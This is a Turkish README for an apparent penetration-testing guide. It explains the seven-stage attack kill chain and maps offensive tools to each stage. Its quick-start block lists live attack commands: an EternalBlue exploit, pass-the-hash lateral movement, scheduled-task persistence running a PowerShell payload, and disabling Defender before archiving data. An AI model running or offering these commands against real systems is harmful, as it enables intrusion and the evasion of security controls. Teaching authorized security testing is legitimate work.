# 🎯 Saldırı Metodolojisi - Kill Chain

[🇬🇧 English](../../README.md) • [🇮🇹 Versione Italiana](README.it.md)

```
   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ██╗  ██╗██╗██╗     ██╗          ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██║ ██╔╝██║██║     ██║         ██╔════╝██║  ██║██╔══██╗██║████╗  ██║
  ███████║   ██║      ██║   ███████║██║     █████╔╝     █████╔╝ ██║██║     ██║         ██║     ███████║███████║██║██╔██╗ ██║
  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ██╔═██╗ ██║██║     ██║         ██║     ██╔══██║██╔══██║██║██║╚██╗██║
  ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ██║  ██╗██║███████╗███████╗    ╚██████╗██║  ██║██║  ██║██║██║ ╚████║
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
```

---

## 🎯 Siber Saldırı Yaşam Döngüsü (Attack Kill Chain) Nedir?

**Saldırı Yaşam Döngüsü (Cyber Kill Chain / MITRE ATT&CK)**, bir saldırganın hedef sisteme veya kurumsal ağa sızmak, yetki yükseltmek ve hedeflerini gerçekleştirmek için izlediği aşamaları tanımlar.

---

## 📊 Kill Chain Aşamaları

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                       SALDIRI YAŞAM DÖNGÜSÜ (LIFECYCLE)                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 1. İLK ERİŞİM│───▶│ 2. KEŞİF     │───▶│ 3. YETKİ             │        │
│   │ (INIT ACCESS)│    │ (ENUMERATION)│    │ YÜKSELTME (PrivEsc)  │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│          │                                           │                      │
│          │                                           ▼                      │
│          │                               ┌──────────────────────┐          │
│          │                               │ 4. YATAY İLERLEME    │          │
│          │                               │ (LATERAL MOVEMENT)   │          │
│          │                               └──────────────────────┘          │
│          │                                           │                      │
│          │                                           ▼                      │
│          ▼                                           ▼                      │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 7. HEDEF     │◀───│ 6. SAVUNMA   │◀───│ 5. KALICILIK         │        │
│   │ EYLEMLER     │    │ ATLATMA      │    │ SAĞLAMA (Persistence)│        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📖 Aşama Rehberleri

| Aşama | Açıklama | Kılavuz |
|-------|----------|---------|
| **1. İlk Erişim (Initial Access)** | Hedefe ilk tutunma noktası | [📄 Görüntüle](./01-Initial-Access.tr.md) |
| **2. Keşif & Numaralandırma** | Ele geçirilen sistem ve ağ hakkında bilgi toplama | [📄 Görüntüle](./02-Enumeration.tr.md) |
| **3. Yetki Yükseltme (PrivEsc)** | Yetkileri admin/root seviyesine çıkarma | [📄 Görüntüle](./03-Privilege-Escalation.tr.md) |
| **4. Yatay İlerleme (Lateral Movement)** | Ağdaki diğer sistemlere yayılma | [📄 Görüntüle](./04-Lateral-Movement.tr.md) |
| **5. Kalıcılık (Persistence)** | Yeniden başlatma ve tespit durumlarına karşı erişimi koruma | [📄 Görüntüle](./05-Persistence.tr.md) |
| **6. Savunma Atlatma (Defense Evasion)** | AV, EDR ve güvenlik mekanizmalarını aşma | [📄 Görüntüle](./06-Defense-Evasion.tr.md) |
| **7. Hedef Eylemler (Actions on Objectives)** | Nihai amaca ulaşma (veri sızdırma, etki yaratma) | [📄 Görüntüle](./07-Actions-Objectives.tr.md) |

---

## 🔗 İlgili Kılavuzlar

### Aşamaya Göre İlgili Araçlar

| Aşama | İlgili Araçlar |
|-------|----------------|
| İlk Erişim | [Metasploit](../../Metasploit/README.md), [SQLMap](../../SQLMap/README.md), [Hydra](../../Hydra/README.md) |
| Keşif & Numaralandırma | [Nmap](../../Nmap/README.md), [BloodHound](../../BloodHound/README.md), [PowerView](../../PowerView/README.md) |
| Yetki Yükseltme | [Linux-PrivEsc](../../Linux-PrivEsc/README.md), [Windows-PrivEsc](../../Windows-PrivEsc/README.md) |
| Yatay İlerleme | [Impacket](../../Impacket/README.md), [CrackMapExec](../../CrackMapExec/README.md), [Evil-WinRM](../../Evil-WinRM/README.md) |
| Kalıcılık | [PowerShell](../../PowerShell/README.md), [Metasploit](../../Metasploit/README.md) |
| Savunma Atlatma | [Mimikatz](../../Mimikatz/README.md), [PowerShell](../../PowerShell/README.md) |
| Veri Sızdırma | [Linux Komutları](../../Linux-Commands/README.md) |

---

## 📚 Hızlı Başlangıç

### Tipik Bir Saldırı Akışı
```bash
# 1. İlk Erişim - Bir güvenlik açığını istismar etme
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; exploit"

# 2. Keşif - Neye erişiminiz olduğunu tespit etme
whoami /all
systeminfo
net user

# 3. Yetki Yükseltme - SYSTEM veya root yetkisi alma
.\winPEAS.exe

# 4. Yatay İlerleme - Ağdaki diğer sistemlere sıçrama
impacket-psexec -hashes :HASH administrator@192.168.1.20

# 5. Kalıcılık Sağlama - Yeniden başlatma sonrasında erişimi koruma
schtasks /create /tn "Updater" /tr "powershell -ep bypass -c IEX(payload)" /sc onlogon

# 6. Savunma Atlatma - AV / Defender kapatma veya atlatma
Set-MpPreference -DisableRealtimeMonitoring $true

# 7. Hedef Eylemler - Hassas veriyi arşivleyip dışarı sızdırma
Compress-Archive -Path C:\Sensitive -DestinationPath C:\Temp\data.zip
```

---

## 📚 Kaynaklar

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Cyber Kill Chain - Lockheed Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Unified Kill Chain](https://www.unifiedkillchain.com/)

---

<p align="center">
  <b>🎯 Kill Chain Metodolojisini Takip Edin!</b><br>
  <i>Yalnızca izin verilmiş yasal güvenlik testleri içindir.</i>
</p>
